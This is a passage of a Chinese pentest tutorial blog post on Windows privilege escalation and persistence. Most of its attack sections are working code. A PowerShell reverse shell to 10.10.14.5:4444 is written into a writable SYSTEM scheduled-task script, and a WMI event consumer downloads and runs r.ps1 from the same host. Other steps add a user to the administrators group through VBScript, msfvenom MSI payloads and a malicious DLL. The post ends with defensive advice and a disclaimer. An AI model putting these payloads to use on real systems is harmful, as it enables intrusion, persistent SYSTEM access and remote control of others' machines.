class="operator">-match</span> <span class="string">&quot;Write|FullControl|Modify&quot;</span>&#125;) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[!] 可写: <span class="variable">$</span>(<span class="variable">$_</span>.FullName)&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-查找调用脚本的任务"><a href="#4-2-查找调用脚本的任务" class="headerlink" title="4.2 查找调用脚本的任务"></a>4.2 查找调用脚本的任务</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">in</span> <span class="variable">$_</span>.Actions) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>.Arguments <span class="operator">-match</span> <span class="string">&quot;\.ps1|\.bat|\.cmd|\.vbs&quot;</span>) &#123;</span><br><span class="line">            <span class="built_in">Write-Host</span> <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.TaskName): <span class="variable">$</span>(<span class="variable">$a</span>.Execute) <span class="variable">$</span>(<span class="variable">$a</span>.Arguments)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-劫持示例"><a href="#4-3-劫持示例" class="headerlink" title="4.3 劫持示例"></a>4.3 劫持示例</h3><p>假设发现SYSTEM权限的<code>DailyBackup</code>任务执行<code>powershell.exe -File C:\Scripts\backup.ps1</code>，且该脚本可写：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\Scripts\backup.ps1&quot;</span> <span class="string">&quot;C:\Scripts\backup.ps1.bak&quot;</span></span><br><span class="line"><span class="string">@&#x27;</span></span><br><span class="line"><span class="string">$c=New-Object Net.Sockets.TCPClient(&quot;10.10.14.5&quot;,4444);$s=$c.GetStream()</span></span><br><span class="line"><span class="string">[byte[]]$b=0..65535|%&#123;0&#125;</span></span><br><span class="line"><span class="string">while(($i=$s.Read($b,0,$b.Length))-ne0)&#123;</span></span><br><span class="line"><span class="string">$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)</span></span><br><span class="line"><span class="string">$r=(iex $d 2&gt;&amp;1|Out-String);$r2=$r+&quot;PS&gt;&quot;</span></span><br><span class="line"><span class="string">$sb=([text.encoding]::ASCII).GetBytes($r2)</span></span><br><span class="line"><span class="string">$s.Write($sb,0,$sb.Length);$s.Flush()&#125;;$c.Close()</span></span><br><span class="line"><span class="string">&#x27;@</span> | <span class="built_in">Out-File</span> <span class="string">&quot;C:\Scripts\backup.ps1&quot;</span> <span class="literal">-Force</span></span><br><span class="line">schtasks /run /tn <span class="string">&quot;DailyBackup&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、WMI事件订阅持久化与提权"><a href="#五、WMI事件订阅持久化与提权" class="headerlink" title="五、WMI事件订阅持久化与提权"></a>五、WMI事件订阅持久化与提权</h2><h3 id="5-1-原理"><a href="#5-1-原理" class="headerlink" title="5.1 原理"></a>5.1 原理</h3><p>WMI事件订阅由三部分组成，触发后以SYSTEM权限执行代码：</p>
+<ul>
+<li><strong>__EventFilter</strong>：定义触发条件</li>
+<li><strong>CommandLineEventConsumer &#x2F; ActiveScriptEventConsumer</strong>：定义操作</li>
+<li><strong>__FilterToConsumerBinding</strong>：绑定二者</li>
+</ul>
+<h3 id="5-2-检测现有订阅"><a href="#5-2-检测现有订阅" class="headerlink" title="5.2 检测现有订阅"></a>5.2 检测现有订阅</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> __EventFilter GET Name, Query /<span class="built_in">format</span>:list</span><br><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> CommandLineEventConsumer GET Name, CommandLineTemplate /<span class="built_in">format</span>:list</span><br><span class="line">wmic /namespace:&quot;\\root\subscription&quot; <span class="built_in">PATH</span> ActiveScriptEventConsumer GET Name, ScriptText /<span class="built_in">format</span>:list</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter</span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer</span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> ActiveScriptEventConsumer</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-创建WMI提权订阅"><a href="#5-3-创建WMI提权订阅" class="headerlink" title="5.3 创建WMI提权订阅"></a>5.3 创建WMI提权订阅</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤器：系统启动300秒后触发</span></span><br><span class="line"><span class="variable">$filter</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysMaintenance&quot;</span></span><br><span class="line">    EventNamespace = <span class="string">&quot;root\cimv2&quot;</span></span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span></span><br><span class="line">    Query = <span class="string">&quot;SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27; AND TargetInstance.SystemUpTime &gt;= 300&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 消费者：SYSTEM权限执行反弹Shell</span></span><br><span class="line"><span class="variable">$consumer</span> = <span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;SysMaintenanceConsumer&quot;</span></span><br><span class="line">    CommandLineTemplate = <span class="string">&#x27;powershell.exe -NoP -W Hidden -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;</span><span class="string">&#x27;http://10.10.14.5/r.ps1&#x27;</span><span class="string">&#x27;)&quot;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定</span></span><br><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __FilterToConsumerBinding <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="keyword">Filter</span> = <span class="variable">$filter</span>; Consumer = <span class="variable">$consumer</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-4-VBScript消费者"><a href="#5-4-VBScript消费者" class="headerlink" title="5.4 VBScript消费者"></a>5.4 VBScript消费者</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-WmiInstance</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> ActiveScriptEventConsumer <span class="literal">-Arguments</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    Name = <span class="string">&quot;VbsPayload&quot;</span></span><br><span class="line">    ScriptingEngine = <span class="string">&quot;VBScript&quot;</span></span><br><span class="line">    ScriptText = <span class="string">&#x27;Set o=CreateObject(&quot;WScript.Shell&quot;):o.Run &quot;cmd /c net localgroup administrators lowuser /add&quot;,0,False&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-5-清除"><a href="#5-5-清除" class="headerlink" title="5.5 清除"></a>5.5 清除</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __EventFilter | ?&#123;<span class="variable">$_</span>.Name <span class="operator">-match</span> <span class="string">&quot;SysMaintenance|VbsPayload&quot;</span>&#125; | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> CommandLineEventConsumer | ?&#123;<span class="variable">$_</span>.Name <span class="operator">-match</span> <span class="string">&quot;SysMaintenance&quot;</span>&#125; | <span class="built_in">Remove-WmiObject</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> <span class="literal">-Namespace</span> <span class="string">&quot;root\subscription&quot;</span> <span class="literal">-Class</span> __FilterToConsumerBinding | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、AlwaysInstallElevated注册表提权"><a href="#六、AlwaysInstallElevated注册表提权" class="headerlink" title="六、AlwaysInstallElevated注册表提权"></a>六、AlwaysInstallElevated注册表提权</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p>当HKCU和HKLM的<code>AlwaysInstallElevated</code>同时为<code>0x1</code>时，普通用户安装的MSI包将以SYSTEM权限运行。</p>
+<h3 id="6-2-检测"><a href="#6-2-检测" class="headerlink" title="6.2 检测"></a>6.2 检测</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hkcu</span> = (<span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKCU:\Software\Policies\Microsoft\Windows\Installer&quot;</span> <span class="literal">-Name</span> AlwaysInstallElevated <span class="literal">-EA</span> <span class="number">0</span>).AlwaysInstallElevated</span><br><span class="line"><span class="variable">$hklm</span> = (<span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows\Installer&quot;</span> <span class="literal">-Name</span> AlwaysInstallElevated <span class="literal">-EA</span> <span class="number">0</span>).AlwaysInstallElevated</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hkcu</span> <span class="operator">-eq</span> <span class="number">1</span> <span class="operator">-and</span> <span class="variable">$hklm</span> <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[!] AlwaysInstallElevated 已启用&quot;</span> <span class="literal">-ForegroundColor</span> Red &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-利用"><a href="#6-3-利用" class="headerlink" title="6.3 利用"></a>6.3 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机生成MSI</span></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o payload.msi</span><br><span class="line">msfvenom -p windows/x64/exec CMD=<span class="string">&quot;net localgroup administrators user /add&quot;</span> -f msi -o adduser.msi</span><br></pre></td></tr></table></figure>
+
+<p>在目标机执行：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\temp\payload.msi</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、DLL搜索顺序劫持（DLL-Search-Order-Hijacking）"><a href="#七、DLL搜索顺序劫持（DLL-Search-Order-Hijacking）" class="headerlink" title="七、DLL搜索顺序劫持（DLL Search Order Hijacking）"></a>七、DLL搜索顺序劫持（DLL Search Order Hijacking）</h2><h3 id="7-1-Windows-DLL搜索顺序"><a href="#7-1-Windows-DLL搜索顺序" class="headerlink" title="7.1 Windows DLL搜索顺序"></a>7.1 Windows DLL搜索顺序</h3><p>启用SafeDllSearchMode（默认）时的搜索顺序：</p>
+<ol>
+<li>应用程序所在目录 → 2. <code>System32\</code> → 3. <code>System\</code> → 4. <code>Windows\</code> → 5. 当前工作目录 → 6. PATH目录</li>
+</ol>
+<p>若高权限进程所在目录缺失DLL且该目录对低权限用户可写，即可实施劫持。</p>
+<h3 id="7-2-使用ProcMon发现机会"><a href="#7-2-使用ProcMon发现机会" class="headerlink" title="7.2 使用ProcMon发现机会"></a>7.2 使用ProcMon发现机会</h3><p>用Process Monitor筛选计划任务进程，过滤器设为：<code>Result</code> &#x3D; <code>NAME NOT FOUND</code>，<code>Path</code>以<code>.dll</code>结尾。这些即为可劫持的缺失DLL。</p>
+<h3 id="7-3-检测可写目录"><a href="#7-3-检测可写目录" class="headerlink" title="7.3 检测可写目录"></a>7.3 检测可写目录</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$commonDlls</span> = <span class="selector-tag">@</span>(<span class="string">&quot;version.dll&quot;</span>,<span class="string">&quot;dbghelp.dll&quot;</span>,<span class="string">&quot;profapi.dll&quot;</span>,<span class="string">&quot;vcruntime140.dll&quot;</span>,<span class="string">&quot;msvcp140.dll&quot;</span>,<span class="string">&quot;cryptbase.dll&quot;</span>)</span><br><span class="line"><span class="variable">$paths</span> = <span class="built_in">Get-ScheduledTask</span> | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_</span>.Actions.Execute &#125; | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span> <span class="operator">-and</span> (<span class="built_in">Test-Path</span> <span class="variable">$_</span>)&#125; | <span class="built_in">ForEach-Object</span> &#123; <span class="built_in">Split-Path</span> <span class="variable">$_</span> <span class="literal">-Parent</span> &#125; | <span class="built_in">Select-Object</span> <span class="literal">-Unique</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$d</span> <span class="keyword">in</span> <span class="variable">$paths</span>) &#123;</span><br><span class="line">    <span class="variable">$acl</span> = <span class="built_in">Get-Acl</span> <span class="variable">$d</span></span><br><span class="line">    <span class="variable">$canWrite</span> = <span class="variable">$acl</span>.Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">        (<span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&quot;Users|Everyone&quot;</span>) <span class="operator">-and</span> (<span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&quot;Write|FullControl&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$canWrite</span>) &#123;</span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[!] DLL劫持机会: <span class="variable">$d</span>&quot;</span> <span class="literal">-ForegroundColor</span> Red</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dll</span> <span class="keyword">in</span> <span class="variable">$commonDlls</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="operator">-not</span> (<span class="built_in">Test-Path</span> <span class="string">&quot;<span class="variable">$d</span>\<span class="variable">$dll</span>&quot;</span>)) &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;  缺失: <span class="variable">$d</span>\<span class="variable">$dll</span>&quot;</span> <span class="literal">-ForegroundColor</span> Yellow &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-4-恶意DLL制作"><a href="#7-4-恶意DLL制作" class="headerlink" title="7.4 恶意DLL制作"></a>7.4 恶意DLL制作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// evil.c - 编译: x86_64-w64-mingw32-gcc -shared -o version.dll evil.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE h, DWORD r, LPVOID l)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (r == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        system(<span class="string">&quot;cmd /c net localgroup administrators lowuser /add&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将编译好的DLL放置到可写的计划任务目录中即可：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> <span class="string">&quot;C:\temp\version.dll&quot;</span> <span class="string">&quot;C:\Program Files\Vendor\App\version.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、综合防御建议"><a href="#八、综合防御建议" class="headerlink" title="八、综合防御建议"></a>八、综合防御建议</h2><ol>
+<li><strong>定期审计计划任务</strong>：用PowerShell脚本检查异常TaskName和Action。</li>
+<li><strong>限制启动文件夹权限</strong>：确保只有受信用户可写入。</li>
+<li><strong>监控注册表Run键</strong>：使用Sysmon监控<code>Microsoft\Windows\CurrentVersion\Run*</code>的修改。</li>
+<li><strong>审查WMI订阅</strong>：定期检查<code>root\subscription</code>命名空间。</li>
+<li><strong>禁用AlwaysInstallElevated</strong>：确保两处注册表值不为<code>0x1</code>。</li>
+<li><strong>最小权限原则</strong>：计划任务执行目录和脚本目录不应被低权限用户写入。</li>
+<li><strong>启用代码签名与SafeDllSearchMode</strong>：防止未签名DLL被加载。</li>
+</ol>
+<hr>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page">Microsoft Docs - Task Scheduler</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/">MITRE ATT&amp;CK - Scheduled Task (T1053)</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1547/">MITRE ATT&amp;CK - Boot or Logon Autostart Execution (T1547)</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1546/">MITRE ATT&amp;CK - Event Triggered Execution (T1546)</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/001/">MITRE ATT&amp;CK - DLL Search Order Hijacking (T1574.001)</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">HackTricks - Windows Privilege Escalation</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>再次声明</strong>：本文仅供教育与授权的渗透测试用途。请在获得明确书面授权的前提下进行安全测试。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/SQL-injection-postgresql/" rel="prev" title="SQL注入：PostgreSQL注入实战">
+                  <i class="fa fa-angle-left"></i> SQL注入：PostgreSQL注入实战
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SQL-injection-oracle/" rel="next" title="SQL注入：Oracle注入实战">
+                  SQL注入：Oracle注入实战 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
